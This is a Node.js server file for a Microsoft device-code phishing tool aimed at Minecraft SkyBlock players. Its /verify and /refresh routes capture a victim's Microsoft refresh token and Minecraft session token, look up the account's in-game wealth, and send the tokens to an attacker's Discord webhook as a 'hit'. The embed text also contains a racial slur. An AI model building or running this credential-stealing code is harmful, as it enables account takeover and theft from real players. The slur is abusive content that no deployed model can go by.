const Authflow = require('./src/MicrosoftAuthFlow')
const axios = require('axios')
const express = require('express');
const cache = require('./src/common/cache/FileCache')
const { EmbedBuilder, WebhookClient } = require('discord.js');
const app = express();
const fs = require('fs');

function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

async function GetPlayer(BearerToken) {
  const url = 'https://api.minecraftservices.com/minecraft/profile'
  const config = {
      headers: {
          'Authorization': 'Bearer ' + BearerToken,
      }
  }
  let response = await axios.get(url, config)
  return [response.data['id'], response.data['name']]
}

const testAuth = async (res) => {
  const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' })

  const ret = await flow.msa.authDeviceCode((response) => {
    if (flow.codeCallback) return flow.codeCallback(response)
  }, res)

  const dt = await flow.xbl.getDeviceToken()
  const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt)

  const xboxLogin = await getXboxLogin(sisu);
 
  const [id, name] = await GetPlayer(xboxLogin)

  SSIDCode = '```' + xboxLogin + '```'

  const skycryptInfo = await getInfo(name);

  sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
}

const getXboxLogin = async (res) => {
  let DataBearerToken = {
    identityToken: `XBL3.0 x=${res.userHash};${res.XSTSToken}`,
    ensureLegacyEnabled: true
  }

  ResponseBearerToken = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', DataBearerToken, { headers: { 'Content-Type': 'application/json' } })

  console.log(ResponseBearerToken.data.access_token)

  return ResponseBearerToken.data.access_token;
};

const getInfo = async (res) => {
  SkyCryptProfile = await axios.get('https://sky.shiiyu.moe/api/v2/profile/' + res, { headers: { 'Content-Type': 'application/json' } })

  const firstProfileKey = Object.keys(SkyCryptProfile.data.profiles)[0];
  const firstProfileData = SkyCryptProfile.data.profiles[firstProfileKey];

  return firstProfileData;
};

const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
  const webhookClient = new WebhookClient({ url: 'WEBHOOK GOES HERE' });

  avgSkillLvl = '```' + Math.floor(firstProfileData.data.average_level) + '```'
  purse = '```' +  Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' }) + '```'
  SBLevel = '```' +  Math.floor(firstProfileData.data.skyblock_level.level) + '```'
  networth = '```' +  Math.floor(firstProfileData.data.networth.networth).toLocaleString('en-US', { style: 'decimal' }) + '```'
  uNetworth = '```' +  Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' }) + '```'
  minionSlots = '```' +  Math.floor(firstProfileData.data.minion_slots.currentSlots) + '```'

  const embed = new EmbedBuilder()
  .setColor(0x5D3FD3)
  .setTitle(name)
  .setURL('https://sky.shiiyu.moe/stats/' + name)
  .setThumbnail('https://crafatar.com/avatars/' + id)
  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'http://PUT UR URL HERE/refresh?refreshToken=' + refresh })
  .addFields(
    { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
    { name: ' ', value: ' ' },
    { name: 'Average Skill Lvl', value: avgSkillLvl, inline: true }, { name: 'SB Level', value: SBLevel, inline: true },
    { name: ' ', value: ' ' },
    { name: 'Minion Slots', value: minionSlots, inline: true }, { name: 'Purse', value: purse, inline: true },
    { name: 'SSID: ', value: SSIDCode },
  )
  .setTimestamp()

  webhookClient.send({
    content: '@everyone',
    embeds: [embed]
  });
};

app.get('/verify', async (req, res) => {
  try {
    testAuth(res); 
  } catch (err) {
    console.error('Authentication error:', err);
    res.status(500).send('Authentication failed.'); 
  }
});

app.get('/refresh', async (req, res) => {
  try {
    const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' })

    const ret = await flow.msa.refreshTokens(req.query.refreshToken);

    const dt = await flow.xbl.getDeviceToken()

    const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt)
  
    const xboxLogin = await getXboxLogin(sisu);
   
    const [id, name] = await GetPlayer(xboxLogin)
  
    SSIDCode = '```' + xboxLogin + '```'
  
    const skycryptInfo = await getInfo(name);
  
    sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
  } catch (err) {
    console.error('Refresh error:', err);
    res.status(500).send('Refresh failed.');
  } 
});

const startApp = async () => {
  try {
    app.listen(process.env.PORT || 27017, () => {
        console.log(`Server started on port 27017`);
    });
  } catch (err) {
    console.error(`Error starting the application: ${err.message}`);
    process.exit(1);
  }
}

startApp();